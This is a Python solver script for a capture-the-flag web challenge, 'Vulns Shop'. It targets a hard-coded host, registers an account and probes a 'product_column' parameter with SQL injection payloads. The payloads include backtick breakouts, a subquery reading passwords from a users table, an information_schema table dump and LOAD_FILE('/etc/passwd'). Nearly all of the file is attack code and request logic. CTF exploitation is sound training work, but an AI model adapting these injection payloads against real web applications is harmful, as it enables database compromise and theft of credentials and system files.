#!/usr/bin/env python3
"""
Vulns Shop - CTF Challenge Solver
Category: Web, 500 points

A webshop selling vulnerabilities (XSS, SQL injection, SSTI, CSRF to RCE, Uknown 0day).

Key findings:
1. The products.php page has a "product_column" parameter used in SQL query
2. The query template is: SELECT `$column` FROM products WHERE id = ?
3. Backtick quoting prevents most SQL injection
4. Input containing "--" triggers a different "security" code path
5. The security path removes the WHERE clause (causes parameter count mismatch)
6. Adding ? placeholder to injection matches param count but MySQL rejects it
"""

import requests
import re
import sys

BASE_URL = "http://178.105.86.125:26202"

def register(session, username, password):
    r = session.post(f"{BASE_URL}/register.php", data={
        "username": username,
        "password": password
    }, allow_redirects=False)
    # Registration redirects to login on success
    if r.status_code == 302:
        return True
    return "Account created" in r.text or "Login" in r.text

def login(session, username, password):
    r = session.post(f"{BASE_URL}/login.php", data={
        "username": username,
        "password": password
    })
    return "Logged in as" in r.text

def get_balance(session):
    r = session.get(f"{BASE_URL}/products.php")
    match = re.search(r'Balance: €([\d.]+)', r.text)
    return float(match.group(1)) if match else None

def buy_product(session, product_id):
    r = session.post(f"{BASE_URL}/buy.php", data={"product_id": str(product_id)})
    return r.text.strip()

def get_purchases(session):
    r = session.get(f"{BASE_URL}/dashboard.php")
    purchases = re.findall(r'<h3>([^<]+)</h3>', r.text)
    return purchases

def test_sql_injection(session, payload):
    """Test SQL injection in product_column parameter"""
    r = session.get(f"{BASE_URL}/products.php", params={
        "product_id_detail": "1",
        "product_column": payload
    })
    
    if "Fatal error" in r.text:
        if "Unknown column" in r.text:
            match = re.search(r"Unknown column '([^']+)'", r.text)
            col = match.group(1) if match else "?"
            return f"Unknown column: {col}"
        elif "Invalid parameter" in r.text:
            return "Parameter mismatch"
        elif "syntax error" in r.text:
            return "Syntax error"
        else:
            err = r.text[r.text.find("<b>Fatal"):r.text.find("<br />")]
            return f"Error: {err[:120]}"
    elif "Product detail" in r.text:
        # Success! Extract data
        cells = re.findall(r'<td>([^<]*)</td>', r.text)
        headers = re.findall(r'<th>([^<]*)</th>', r.text)
        return f"SUCCESS! Headers: {headers}, Data: {cells}"
    return "Other response"

def main():
    # Create session and login
    session = requests.Session()
    username = f"user_{__import__('random').randint(10000, 99999)}"
    
    if not register(session, username, username):
        print(f"Failed to register {username}")
        return 1
    
    if not login(session, username, username):
        print(f"Failed to login as {username}")
        return 1
    
    balance = get_balance(session)
    print(f"Logged in as {username}, Balance: €{balance}")
    
    # Enumerate products
    print("\n=== Products ===")
    for pid in range(1, 6):
        r = session.get(f"{BASE_URL}/products.php", params={
            "product_id_detail": str(pid),
            "product_column": "id"
        })
        if "Product detail" in r.text:
            name_match = re.search(r'<td>([^<]*)</td>', r.text)
            print(f"  Product {pid}: ID exists")
        else:
            print(f"  Product {pid}: Not found")
    
    # Enumerate columns
    print("\n=== Columns in products table ===")
    valid_cols = []
    for col in ["id", "name", "description", "price", "stock"]:
        r = session.get(f"{BASE_URL}/products.php", params={
            "product_id_detail": "1",
            "product_column": col
        })
        if "Product detail" in r.text and "Unknown column" not in r.text:
            cells = re.findall(r'<td>([^<]*)</td>', r.text)
            print(f"  {col}: EXISTS (value: {cells[0] if cells else 'NULL/empty'})")
            valid_cols.append(col)
    
    # Test SQL injection behavior
    print("\n=== SQL Injection Analysis ===")
    
    # Test 1: Normal column works
    result = test_sql_injection(session, "name")
    print(f"  Normal column 'name': {result}")
    
    # Test 2: Backtick without -- does NOT break out
    result = test_sql_injection(session, "id` FROM products")
    print(f"  Backtick only: {result}")
    
    # Test 3: -- triggers security path, removes WHERE, causes mismatch
    result = test_sql_injection(session, "id` FROM products-- ")
    print(f"  Backtick + --: {result}")
    
    # Test 4: Adding ? matches param count but MySQL rejects
    result = test_sql_injection(session, "id` FROM products WHERE id=?-- ")
    print(f"  Backtick + ? + --: {result}")
    
    # Try to buy affordable products
    print("\n=== Buying Vulnerabilities ===")
    products_to_buy = [1, 2, 3]  # XSS, SQLi, SSTI
    for pid in products_to_buy:
        result = buy_product(session, pid)
        if "Not enough money" in result:
            print(f"  Product {pid}: Not enough money")
        else:
            print(f"  Product {pid}: Purchased (or error: {result[:50]})")
    
    balance = get_balance(session)
    print(f"\nRemaining balance: €{balance}")
    print(f"Purchases: {get_purchases(session)}")
    
    # Check if we can afford the expensive products
    print("\n=== Expensive Products ===")
    result = buy_product(session, 4)  # CSRF to RCE (€1337)
    print(f"  CSRF to RCE (product 4): {result[:80]}")
    
    result = buy_product(session, 5)  # Uknown 0day (€1337)
    print(f"  Uknown 0day (product 5): {result[:80]}")
    
    # Attempt SQL injection to read from other tables
    print("\n=== SQL Injection Payloads ===")
    payloads = [
        # Try to read users table (with ? for param matching)
        ("id`,(SELECT password FROM users WHERE id=?)`name--", "password from users"),
        ("id`,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())`name--", "table names"),
        # Try LOAD_FILE
        ("id`,LOAD_FILE('/etc/passwd')`name--", "read /etc/passwd"),
        # Simple: read another column from another table
        ("id`,(SELECT 1)`name--", "simple subquery with ?"),
    ]
    
    for payload, description in payloads:
        result = test_sql_injection(session, payload)
        print(f"  {description}: {result}")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
